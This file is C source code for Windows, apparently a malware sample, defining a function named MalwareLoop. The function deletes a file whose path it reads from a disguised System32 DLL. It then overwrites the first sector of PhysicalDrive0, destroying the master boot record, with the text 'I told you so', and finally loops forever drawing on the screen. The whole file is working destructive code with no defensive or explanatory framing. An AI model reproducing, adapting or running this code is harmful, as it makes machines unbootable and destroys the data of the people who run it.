#include "loop.h"
#include <fileapi.h>
#include <winuser.h>






VOID MalwareLoop(){
    static BOOL init = FALSE;
    if(init == FALSE){
        HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\Windows.UI.NtHal.dll", 
                GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(hFile != INVALID_HANDLE_VALUE){
            WCHAR file[512];
            BOOL result = ReadFile(hFile, file, 512, NULL, NULL);
            if(result){
                BOOL result = DeleteFileW(file);
                if(!result) {
                    WCHAR buff[612];
                    wsprintfW(buff, L"%s\n", file);
                    MessageBoxW(NULL, buff, L"l", MB_OK);
                }
                CloseHandle(hFile);
                DeleteFileW(L"C:\\Windows\\System32\\Windows.UI.NtHal.dll");
            }
            else{
                MessageBoxW(NULL, L"m", L"m", MB_OK);
            }
            init = TRUE;

        }  
        init = TRUE;
    }
    HANDLE hMasterBootRecord = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
    WriteFile(hMasterBootRecord, "I told you so", 512, NULL, NULL);
    HDC dc = GetDC(NULL);
    while(1){
        PatBlt(dc, 10, 10, 90, 90, 0);
    }
}